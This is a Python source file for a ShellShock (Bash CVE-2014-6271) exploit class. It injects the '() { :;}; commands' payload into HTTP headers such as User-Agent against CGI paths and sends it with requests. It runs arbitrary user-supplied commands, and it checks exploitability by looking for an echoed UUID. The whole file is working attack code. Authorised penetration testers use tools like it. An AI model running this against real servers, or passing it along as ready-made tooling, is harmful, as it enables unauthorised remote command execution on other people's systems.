import requests # Cool, insanely simple HTTP requests library.
import uuid # To make the exploitability tag randomized, unique, and long
import click # Click is Armin Ronacher's new CLI framework. It's awesomesauce.

class ShellShocker:
  """
  A ShellShock exploit class
  You can create a payload, send it, and grab the response.
  """

  commonVulnerableRoutes = ['/cgi-bin/test.cgi']
  commonVulnerableHeaders = ['User-Agent', 'Cookie', 'Referer']

  def __init__(self, options):
    """
    Initialization method of the ShellShocker class
    Pass it a dict of options.
    """

    self.payload_headers = ["User-Agent"]
    self.commands = ""
    self.exploit_tag = ""
    self.payload = "() {{ :;}}; {commands}"
    self.exploit_response = ""
    self.verbose = False

    try:
      self.url = options['url']
    except KeyError as e:
      click.echo('Something ({specificerror}) not found in the options parameter'.format(specificerror = str(e)))
      raise

    try:
      if options['commands']:
        self.commands = options['commands']
      if options['payload_headers']:
        self.payload_headers = options['payload_headers']
      if options['verbosity']:
        self.verbose = options['verbosity']
    except:
      pass

  def bazinga(self):
    """
    Send the exploit to the url, and returns a Response object back (as well as
    storing it in self.exploit_response)
    """
    self.payload = self.payload.format(commands = self.commands)
    headers = {}
    for header in self.payload_headers:
      headers.update({header: self.payload})
    self.exploit_response = requests.get(self.url, headers=headers)

  def exploitable(self):
    """
    Is the site exploitable?
    """
    self.exploit_tag = str(uuid.uuid4())
    if self.commands == "":
      self.commands = "echo; echo {exploit_tag}".format(exploit_tag=self.exploit_tag)
    self.bazinga()
    exploit_results = self.exploit_response.text
    if self.verbose:
      click.echo(click.style('The request returned: ', fg="magenta"))
      click.echo(exploit_results)
    self.exploit_response.close()
    if self.exploit_tag in exploit_results:
      return True
    return False
